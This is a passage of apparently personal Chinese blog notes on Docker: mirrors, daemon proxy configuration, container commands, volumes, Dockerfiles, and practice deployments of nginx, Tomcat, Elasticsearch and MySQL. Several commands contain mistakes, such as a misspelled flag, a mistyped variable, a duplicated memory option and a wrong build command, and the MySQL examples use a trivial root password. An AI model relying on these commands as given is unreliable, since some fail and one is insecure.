<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<p>加入这个中科大的源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重新加载配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<p><strong>docker代理</strong></p>
<p><strong>docker是一个非常方便的容器环境，但docker常常需要拉取大量的镜像，而docker hub的主机又架设在国外，如果使用国内网络访问，将十分的慢，因此我们可以使用国外的代理访问。</strong><br><strong>然而，问题来了，我们使用以下命令试图让docker走代理，却遇到了问题：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">proxy_on</span></span>() &#123;</span><br><span class="line">    <span class="built_in">export</span> http_proxy=http://your_ip:your_port</span><br><span class="line">    <span class="built_in">export</span> https_proxy=<span class="variable">$http_proxy</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;终端代理已开启。&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">proxy_off</span></span>()&#123;</span><br><span class="line">    <span class="built_in">unset</span> http_proxy https_proxy</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;终端代理已关闭。&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通过<code>proxy_on</code>启动代理，<code>proxy_off</code>关闭代理。</strong></p>
<p><strong>敲完之后<code>source /etc/profile</code>即可使用</strong></p>
<p><strong>可以执行<code>curl cip.cc</code>验证：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># proxy_on</span></span><br><span class="line">终端代理已开启。</span><br><span class="line">root@raspbian:~<span class="comment"># curl cip.cc</span></span><br><span class="line">IP      : 124.156.0.207</span><br><span class="line">地址    : 中国  中国</span><br><span class="line"></span><br><span class="line">数据二  : 印度 | 孟买腾讯云</span><br><span class="line"></span><br><span class="line">数据三  : 印度马哈拉施特拉孟买 | 腾讯</span><br><span class="line"></span><br><span class="line">URL     : http://www.cip.cc/124.156.0.207</span><br></pre></td></tr></table></figure>

<p><strong>但是，你在拉取docker镜像的时候发现还是龟速，几k几k这样,docker容器依旧非常的慢，而使用<code>curl cip.cc</code>返回的确实是国外的<code>ip</code>，这是怎么回事呢？</strong><br><strong>原来，docker这个程序只是一个控制台程序，用于<code>attach</code>，真正操作docker的是运行在后台的<code>docker daemon</code>，也就是我们需要通过<code>systemctl start docker</code>来启动<code>docker daemon</code>。所以说即使我们设置了环境变量<code>http_proxy</code>，那么也只是针对前台<code>docker console</code>使用，而真正访问<code>pull</code>镜像的确是后台的<code>daemon</code>，因此，需要设置<code>daemon</code>访问<code>proxy</code>。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br><span class="line">vim /etc/systemd/system/docker.service.d/http-proxy.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment=<span class="string">&quot;HTTP_PROXY=http://your_ip:your_port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;HTTPS_PROXY=http://your_ip:your_port/&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<p><strong>注意：这个东西的使用是在本地搭建了代理的前提下使用</strong></p>
<p><strong>注意：其实可以配加速源来下载东西的，我就喜欢折腾</strong></p>
<h5 id="四-docker命令"><a href="#四-docker命令" class="headerlink" title="四.docker命令"></a>四.docker命令</h5><p>查看docker安装的镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p>搜索镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search 目标镜像</span><br></pre></td></tr></table></figure>

<p>下载目标镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull 目标镜像</span><br></pre></td></tr></table></figure>

<p>下载指定版本的目标镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull 目标镜像:版本</span><br></pre></td></tr></table></figure>

<p>卸载目标镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi -f 容器ID 容器ID 容器ID 容器ID</span><br></pre></td></tr></table></figure>

<p>运行容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"><span class="comment"># 参数说明</span></span><br><span class="line">--name=<span class="string">&quot;Name&quot;</span>    Name是你给容器起的名字，来区分容器</span><br><span class="line">-d               后台方式运行</span><br><span class="line">-it              使用交互方式运行，加入容器看内容</span><br><span class="line">-p               指定容器的端口 -p 8080：8080</span><br><span class="line">	-p IP:主机端口：容器端口</span><br><span class="line">	-p 主机端口：容器端口</span><br><span class="line">	-p 容器端口</span><br><span class="line">-P（大P） 随机指定端口</span><br></pre></td></tr></table></figure>



<p>查看正在运行的容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">-a <span class="comment">#列出当前正在运行的容器+带出历史运行过的容器</span></span><br><span class="line">-q <span class="comment">#列出容器id</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>退出容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span>  <span class="comment">#直接容器停止并且退出</span></span><br><span class="line">ctrl + p + q   <span class="comment">#容器不停止退出</span></span><br></pre></td></tr></table></figure>

<p>删除容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 容器<span class="built_in">id</span>      <span class="comment">#删除指定的容器，不能删除正在运行发容器 </span></span><br><span class="line">docker <span class="built_in">rm</span> -f $(docker ps -aq)      <span class="comment">#删除所有容器</span></span><br><span class="line">docker ps -aq | xargs docker <span class="built_in">rm</span>    <span class="comment">#删除所有容器</span></span><br></pre></td></tr></table></figure>

<p>启动和停止容器的操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start 容器<span class="built_in">id</span>   <span class="comment">#启动容器</span></span><br><span class="line">docker restart 容器<span class="built_in">id</span> <span class="comment">#重启容器</span></span><br><span class="line">docker stop 容器<span class="built_in">id</span>    <span class="comment">#停止当前正在运行的容器</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器<span class="built_in">id</span>    <span class="comment">#强制停止当前容器</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="五-常用其他命令"><a href="#五-常用其他命令" class="headerlink" title="五.常用其他命令"></a>五.常用其他命令</h5><p>后台启动容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d 镜像名</span><br><span class="line"><span class="comment"># 问题docker ps ，发现centos 停止了</span></span><br><span class="line"><span class="comment">#常见的坑，docker容器使用后台运行，就必须要有一个前台进程，docker发现没有应用，就会自动停止</span></span><br><span class="line"><span class="comment">#nginx，容器启动后发现自己没有提供服务，就会立刻停止，就是没有程序了</span></span><br></pre></td></tr></table></figure>

<p>查看日志目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker logs -tf --<span class="built_in">tail</span> 10 容器<span class="built_in">id</span>      <span class="comment">#看十条容器日志</span></span><br><span class="line">-tf <span class="comment">#显示日志</span></span><br><span class="line">--<span class="built_in">tail</span> number <span class="comment">#要显示日志条数</span></span><br></pre></td></tr></table></figure>

<p>查看容器中进程信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker top 容器<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p>查看容器的原数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker inspect 容器<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p>备份：导出容器数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">export</span> 容器<span class="built_in">id</span> &gt; xx.tar</span><br></pre></td></tr></table></figure>

<p>备份：导入备份数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> xx.tar | docker import - 镜像用户/镜像名:镜像版本号</span><br></pre></td></tr></table></figure>

<p>打包容器成为镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -m=<span class="string">&quot;提交的描述信息&quot;</span> -a=<span class="string">&quot;作者&quot;</span> 容器<span class="built_in">id</span> 要创建的目标镜像名:[标签名]</span><br></pre></td></tr></table></figure>





<p>进入当前正在运行的容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">方式一：进去容器后开启一个新的终端，可以在里面操作（常用）</span><br><span class="line">docker <span class="built_in">exec</span> -it 容器<span class="built_in">id</span> /bin/bash</span><br><span class="line">方式二:进入正在运行的终端，不会启动新的进程</span><br><span class="line">docker attach 容器<span class="built_in">id</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拷贝容器里面的数据到主机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> 容器<span class="built_in">id</span>：/home/* /home</span><br><span class="line"><span class="comment"># 把容器的home目录下的全部文件拷贝到我主机的home目录</span></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it centos /bin/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d centos /bin/sh -c <span class="string">&quot;while true;do echo helloworld;sleep 1;done&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="作业一，部署nginx"><a href="#作业一，部署nginx" class="headerlink" title="作业一，部署nginx"></a>作业一，部署nginx</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search nginx     <span class="comment">#搜索镜像</span></span><br><span class="line">docker pull nginx       <span class="comment">#下载镜像</span></span><br><span class="line">docker images</span><br><span class="line">docker run -d --name nginx01 -p 3344:80     -p 宿主机：容器内部端口</span><br><span class="line">curl localhost:3344     <span class="comment">#本机自测</span></span><br><span class="line">docker ps</span><br><span class="line">docker <span class="built_in">exec</span> -it nginx01 /bin/bash</span><br><span class="line">docker stop 容器<span class="built_in">id</span>	</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="作业二，部署tomcat"><a href="#作业二，部署tomcat" class="headerlink" title="作业二，部署tomcat"></a>作业二，部署tomcat</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --<span class="built_in">rm</span> tomcat:9.0   <span class="comment">#用完即删，版本9.0</span></span><br><span class="line">docker pull tomcat:9.0</span><br><span class="line">docker images</span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat</span><br><span class="line">docker <span class="built_in">exec</span> -it tomecat01 /bin/bash</span><br><span class="line"><span class="comment"># 发现问题：1.linux命令太少 2.没有webapp 阿里云镜像默认最小镜像，所有不必要的的剔除掉</span></span><br><span class="line"><span class="comment">#保证最小运行环境</span></span><br></pre></td></tr></table></figure>

<h6 id="作业三，部署ES（elasticsearch）-kibana"><a href="#作业三，部署ES（elasticsearch）-kibana" class="headerlink" title="作业三，部署ES（elasticsearch）+kibana"></a>作业三，部署ES（elasticsearch）+kibana</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name elasticsearch01 -p 9200:9200 -p 9300:9300 -e <span class="string">&quot;discovery.type=single-node&quot;</span> elasticsearch:7.6.2</span><br><span class="line"></span><br><span class="line"><span class="comment">#docker stats 容器id #查看容器的内存</span></span><br><span class="line"></span><br><span class="line">docker run -d --name elasticsearch01 -p 9200:9200 -p 9300:9300 -e <span class="string">&quot;discovery.type=single-node&quot;</span> -e ES_JAVA_OPTS=<span class="string">&quot;-Xms64m -Xms512m&quot;</span> elasticsearch:7.6.2</span><br><span class="line"><span class="comment">#改内存使用范围</span></span><br></pre></td></tr></table></figure>

<h5 id="六-commit镜像"><a href="#六-commit镜像" class="headerlink" title="六.commit镜像"></a>六.commit镜像</h5> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit <span class="comment">#提交容器成为一个新的副本</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例如：docker commit -a=<span class="string">&quot;kejulin&quot;</span> -m=<span class="string">&quot;add webapps app&quot;</span> 容器<span class="built_in">id</span> 自己定义一个自己容器的名字</span><br></pre></td></tr></table></figure>

<h4 id="docker-进阶篇"><a href="#docker-进阶篇" class="headerlink" title="docker(进阶篇)"></a>docker(进阶篇)</h4><h5 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h5><p>docker概念的回顾</p>
<p>将环境与应用打包成一个镜像</p>
<p>数据？如果数据都在容器中，那么我们容器删除，数据就会丢失  &#x3D;&#x3D; 需求：数据可以持久化 &#x3D;&#x3D;</p>
<p>MYSQL,容器删了，删库跑路！ &#x3D;&#x3D;需求：MYSQL数据可以存储在本地！&#x3D;&#x3D;</p>
<p>容器之间可以有一个数据共享的技术！Docker容器中产生的数据，同步到本地！</p>
<h5 id="使用数据卷"><a href="#使用数据卷" class="headerlink" title="使用数据卷"></a>使用数据卷</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">方法一：直接使用命令来挂载 -v </span><br><span class="line">docker run -it -v 主机目录：容器内目录 centos /bin/bash</span><br><span class="line"><span class="comment">#占用两倍存储</span></span><br></pre></td></tr></table></figure>



<h5 id="安装MYSQL"><a href="#安装MYSQL" class="headerlink" title="安装MYSQL"></a>安装MYSQL</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull MYSQL:5.7</span><br><span class="line">docker images</span><br><span class="line">docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=密码 --name mysql01 mysql:5.7</span><br><span class="line"><span class="comment">#-e环境配置</span></span><br><span class="line"><span class="comment">#启动成功后，用sqlyog来测试一下</span></span><br><span class="line">docker <span class="built_in">rm</span> -f mysql01  <span class="comment">#删除容器，然后看映射，发现挂载本地数据不会丢失，这就实现容器数据持久化</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="具名挂载和匿名挂载"><a href="#具名挂载和匿名挂载" class="headerlink" title="具名挂载和匿名挂载"></a>具名挂载和匿名挂载</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">##### 匿名挂载</span></span><br><span class="line">-v 容器内路径</span><br><span class="line">docker run -d -p --name nginx01 -v /etc/nginx nginx</span><br><span class="line">docker volume <span class="built_in">ls</span>     <span class="comment">#查看本地所有卷的情况  </span></span><br><span class="line"><span class="comment">#local     9jb9898cfdsds8idvds70v9dsvds9vds90vs9...</span></span><br><span class="line"><span class="comment">#上面就是匿名挂载,我们在 -v 只写了容器内的路径，没有写容器外的路径！</span></span><br><span class="line"></span><br><span class="line">docker run -d -p --name nginx02 -v julintongxue-nginx:/etc/nginx nginx</span><br><span class="line">docker volume <span class="built_in">ls</span></span><br><span class="line">docker volume inspect julintongxue-nginx</span><br><span class="line"><span class="comment">#local      julintongxue-nginx</span></span><br><span class="line"><span class="comment">#通过-v   卷名：容器 内路径</span></span><br><span class="line"><span class="comment">#所有的docker容器内的卷，没有指定目录的情况下都是在/var/lib/docker/volumes/xxxx/_data</span></span><br><span class="line"><span class="comment">#通过具名挂载可以方便找到我们的一个卷，大多数情况在使用 具名挂载</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#如何确定搜索具名挂载还是匿名挂载，还是指定路径挂载！</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">-v 容器内路径              <span class="comment">#匿名挂载</span></span><br><span class="line">-v 卷名：容器内路径         <span class="comment">#具名挂载</span></span><br><span class="line">-v /宿主机路径::容器内路径   <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>拓展：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过 -v 容器内路径：ro rw 改变读写权限</span></span><br><span class="line"><span class="comment">#ro readonly   #只读</span></span><br><span class="line"><span class="comment">#rw readwrite  #可读可写</span></span><br><span class="line"><span class="comment">#一旦这个设置了容器权限，容器对我们挂载出来的内容就有限定了！</span></span><br><span class="line"></span><br><span class="line">docker run -d -p --name nginx02 -v julintongxue-nginx:ro nginx</span><br><span class="line">docker run -d -p --name nginx02 -v julintongxue-nginx:rw nginx</span><br><span class="line"><span class="comment">#ro只要看到就说明这个路径只能通过宿主机来操作，容器内部是无法操作！</span></span><br></pre></td></tr></table></figure>

<h5 id="初识Dockerfile"><a href="#初识Dockerfile" class="headerlink" title="初识Dockerfile"></a>初识Dockerfile</h5><blockquote>
<p>方法一</p>
</blockquote>
<p>Dockerfile 就是用来构建docker 镜像的构建文件！命令脚本！</p>
<p>通过这个脚本可以生成镜像，镜像是一层一层的，每个命令都是一层</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim dockerfile1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">VOLUME [<span class="string">&quot;/volume01&quot;</span>,<span class="string">&quot;/volume02&quot;</span>]</span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;----end----&quot;</span></span><br><span class="line">CMD /bin/bash</span><br><span class="line"><span class="comment">#这里发每一个命令，就是镜像的一层！</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f /home/docker-test-volume/dockerfile1 -t /julintongxue/centos:1.0 .</span><br><span class="line">docker images</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it 容器<span class="built_in">id</span> /bin/bash</span><br><span class="line"><span class="built_in">ls</span>   <span class="comment">#发现挂载的匿名目录</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">docker inspect 容器<span class="built_in">id</span></span><br><span class="line">测试一下刚才的文件是否同步出去了</span><br><span class="line">这种方法我们未来使用的十分多，因为我们通常会构造自己的镜像！</span><br><span class="line">假设构建镜像时候没有挂载卷，要手动挂载 -v 卷名：容器内路径！</span><br></pre></td></tr></table></figure>

<h5 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h5><p>centos02 ——–实现数据同步 ———》centos01</p>
<p>两个或者多个容器之间实现数据共享</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动3个容器，</span></span><br><span class="line">docker images</span><br><span class="line">docker run -it --name docker01 julintongxue/centos:1.0</span><br><span class="line">docker ps</span><br><span class="line">docker run -it --nama docker02 --volumes-from docker01</span><br><span class="line"><span class="built_in">ls</span>   <span class="comment">#发现里面有docker01的挂载文件夹 </span></span><br></pre></td></tr></table></figure>

<p>#只要还有一个容器还在，数据就不会丢失，用删除命令测试</p>
<p>#这是个双向拷贝的概念</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 3310:3306 -v /etc/mysql/con.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -d -p 3310:3306  -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from  mysql:5.7</span><br><span class="line"><span class="comment">#这个时候可以实现两个容器数据同步！</span></span><br></pre></td></tr></table></figure>

<p>结论：容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为主。</p>
<h5 id="dokerfile"><a href="#dokerfile" class="headerlink" title="dokerfile"></a>dokerfile</h5><p>dockerfile是用来构建docker镜像的文件！命令参数脚本！</p>
<p>构建步骤：</p>
<p>1.编写一个dockerfile文件</p>
<p>2.docker build 构建成一个镜像</p>
<p>3.docker run 运行镜像</p>
<p>4.docker push 发布镜像（DockerHub、阿里云镜像仓库！）</p>
<h5 id="DockerFile构建过程"><a href="#DockerFile构建过程" class="headerlink" title="DockerFile构建过程"></a>DockerFile构建过程</h5><p>基础知识：</p>
<p>1.每个保留字（指令）必须是大写字母 </p>
<p>2.执行从上到 下顺序执行</p>
<p>3.#表示注释</p>
<p>4.每一个指令都会创建提交一个新的镜像层，并提交！</p>
<p>dockerfile是面向开发的，我们以后要发布项目，做镜像就要编写dockerfile文件，这个文件十分简单！</p>
<p>Docker镜像逐渐成为企业交付的标准，必须要掌握！</p>
<p>步骤：开发、部署、运维。。。缺一不可！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos:7</span><br><span class="line">ENV container docker</span><br><span class="line">RUN (<span class="built_in">cd</span> /lib/systemd/system/sysinit.target.wants/; <span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> [ <span class="variable">$i</span> == \</span><br><span class="line">systemd-tmpfiles-setup.service ] || <span class="built_in">rm</span> -f <span class="variable">$i</span>; <span class="keyword">done</span>); \</span><br><span class="line"><span class="built_in">rm</span> -f /lib/systemd/system/multi-user.target.wants/*;\</span><br><span class="line"><span class="built_in">rm</span> -f /etc/systemd/system/*.wants/*;\</span><br><span class="line"><span class="built_in">rm</span> -f /lib/systemd/system/local-fs.target.wants/*; \</span><br><span class="line"><span class="built_in">rm</span> -f /lib/systemd/system/sockets.target.wants/*udev*; \</span><br><span class="line"><span class="built_in">rm</span> -f /lib/systemd/system/sockets.target.wants/*initctl*; \</span><br><span class="line"><span class="built_in">rm</span> -f /lib/systemd/system/basic.target.wants/*;\</span><br><span class="line"><span class="built_in">rm</span> -f /lib/systemd/system/anaconda.target.wants/*;</span><br><span class="line">VOLUME [ <span class="string">&quot;/sys/fs/cgroup&quot;</span> ]</span><br><span class="line">CMD [<span class="string">&quot;/usr/sbin/init&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很多官方的都是基础包，很多功能都没，我们通常会自己搭建自己的镜像</p>
<p>dockerfile是面向开发的，以后我们要发布项目，就要自己编写dockerfile文件，这个非常简单</p>
<h5 id="DockerFile指令"><a href="#DockerFile指令" class="headerlink" title="DockerFile指令"></a>DockerFile指令</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM                  <span class="comment">#基础镜像，一切从这里开始构建 </span></span><br><span class="line">MAINTAINER            <span class="comment">#镜像是谁写的，姓名 + 邮箱</span></span><br><span class="line">RUN                   <span class="comment">#镜像构建的时候需要运行的命令</span></span><br><span class="line">ADD                   <span class="comment">#步骤:tomcat镜像，这个tomcat 压缩包！添加内容</span></span><br><span class="line">WORKDIR               <span class="comment">#镜像的工作目录</span></span><br><span class="line">VOLUME                <span class="comment">#挂载的目录</span></span><br><span class="line">EXPOSE                <span class="comment">#暴露端口配置</span></span><br><span class="line">RUN                   <span class="comment">#。。。</span></span><br><span class="line">CMD                   <span class="comment">#指定在这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代</span></span><br><span class="line">ENTRYPOINT            <span class="comment">#指定这个容器启动的时候要运行的命令，可以追加命令</span></span><br><span class="line">ONBUILD               <span class="comment">#当构建一个被继承 DockerFile 这个时候就会运行ONBUILD的指令。触发指令</span></span><br><span class="line">ENV                   <span class="comment">#构建的时候设置环境变量！（内存的时候用过一次了）</span></span><br></pre></td></tr></table></figure>

<h5 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h5><p>vim dockerfile</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.编写dockerfile的文件</span></span><br><span class="line">FROM centos</span><br><span class="line">MAINTAINER julintongxue&lt;xxxxxx@qq.com&gt;</span><br><span class="line">ENV MYPYTH /usr/local</span><br><span class="line">WORKDIR <span class="variable">$MYPATH</span></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;---end---&quot;</span></span><br><span class="line">CMD /bin/bash</span><br><span class="line"><span class="comment"># 2.通过这个文件构建镜像</span></span><br><span class="line"><span class="comment">#命令 docker build -f dockerfile文件路径 -t 镜像名：[tag] .</span></span><br><span class="line"><span class="comment"># 3.测试运行</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">ipconfig</span><br><span class="line">vim</span><br><span class="line"><span class="built_in">exit</span> </span><br><span class="line">docker <span class="built_in">history</span> 容器<span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>区别：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CMD                   <span class="comment">#指定在这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代</span></span><br><span class="line">ENTRYPOINT            <span class="comment">#指定这个容器启动的时候要运行的命令，可以追加命令</span></span><br></pre></td></tr></table></figure>



<p>测试cmd</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">##### 编写dockerfile文件</span></span><br><span class="line">FROM centos</span><br><span class="line">CMD [<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-a&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建镜像</span></span><br><span class="line">docker build -f dockerfile -t cmdtest .</span><br><span class="line"></span><br><span class="line"><span class="comment"># run运行，发现我们的 ls -a </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 想追加一个-l   ls-al</span></span><br><span class="line">docker run 容器<span class="built_in">id</span> -l<span class="comment">#发现报错</span></span><br><span class="line"><span class="comment"># cmd 的清理下 -l 替换了CMD的 [&quot;ls&quot;,&quot;-a&quot;]命令，-l不是命令所以报错！</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试ENTRYPOINT</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim dockerfile</span><br><span class="line">FROM centos</span><br><span class="line">CMD [<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-a&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker build -f dockerfile -t entrypoint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run 容器<span class="built_in">id</span> -l</span><br><span class="line"></span><br><span class="line"><span class="comment">#这个时候发现 输出了ls -la </span></span><br></pre></td></tr></table></figure>

<h2 id="实战：Tomcat镜像"><a href="#实战：Tomcat镜像" class="headerlink" title="实战：Tomcat镜像"></a>实战：Tomcat镜像</h2><p>1.准备镜像文件tomcat压缩包，jdk的压缩包！</p>
<p>2.编写dockerfile文件，官方命名dockerfile</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">MAINTAINER julintongxue&lt;xxxxxx@qq.com&gt;</span><br><span class="line">COPY redme.txt /usr/local/readme.txt</span><br><span class="line">ADD jdk-8ull-linux-64.gz /usr/local</span><br><span class="line">ADD apache-tomcatt-9.0.22.tar.gz /usr/local/</span><br><span class="line">RUN yum -y install vim</span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR <span class="variable">$MYPATH</span></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_11</span><br><span class="line">ENV CLASSPATH  <span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.22</span><br><span class="line">ENV PATH <span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$CATAINA_HOME</span>/lib:<span class="variable">$CATALINA_HOME</span>/bin</span><br><span class="line">EXPOSE 8080</span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.22/bin/startup.sh &amp;&amp; <span class="built_in">tail</span> -F /usr/local/apache-tomcat-9.0.22/bin/logs/catalina.out</span><br></pre></td></tr></table></figure>

<p>####3.构建镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images -t 容器名字或者容器<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p>4.启动镜像</p>
<p>5.访问测试</p>
<p>6.发布项目</p>
<p> 我们以后开发的步骤需要dockerfile的编写</p>
<h4 id="4-wine-最牛的"><a href="#4-wine-最牛的" class="headerlink" title="4.wine(最牛的)"></a>4.wine(最牛的)</h4><h3 id="用脚本完成"><a href="#用脚本完成" class="headerlink" title="用脚本完成"></a>用脚本完成</h3>]]></content>
      <categories>
        <category>Linux系统</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP_Study</title>
    <url>/2022/03/28/PHP-Study/</url>
    <content><![CDATA[<h2 id="php连接数据库"><a href="#php连接数据库" class="headerlink" title="php连接数据库"></a>php连接数据库</h2><p>第一步确认数据库的位置，用户名，密码，位置，ip地址或者网址</p>
